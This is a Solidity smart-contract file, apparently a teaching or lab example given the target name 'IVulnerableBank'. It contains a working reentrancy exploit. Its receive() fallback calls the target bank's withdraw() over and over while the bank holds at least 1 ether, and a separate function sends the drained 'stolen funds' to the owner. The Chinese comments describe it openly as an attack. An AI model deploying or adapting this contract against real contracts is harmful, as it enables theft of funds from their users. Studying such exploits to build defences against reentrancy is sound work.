// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
    function getContractBalance() external view returns (uint256);
    function getBalance(address user) external view returns (uint256);
}

contract AttackContract {
    IVulnerableBank public targetBank;
    address public owner;
    uint256 public attackCount;
    
    constructor(address _bankAddress) {
        targetBank = IVulnerableBank(_bankAddress);
        owner = msg.sender;
    }
    
    // 開始攻擊
    function startAttack() external payable {
        require(msg.value > 0, "Need ether to deposit");
        
        // 1. 先存款到目標銀行
        targetBank.deposit{value: msg.value}();
        
        // 2. 開始提款攻擊
        attackCount = 0;
        targetBank.withdraw();
    }
    
    // 接收以太幣的回退函數 - 這裡實現重入攻擊
    receive() external payable {
        attackCount++;
        
        // 如果銀行還有足夠資金，繼續攻擊
        if (address(targetBank).balance >= 1 ether) {
            targetBank.withdraw();
        }
    }
    
    // 提取盜取的資金
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
    
    // 獲取合約餘額
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}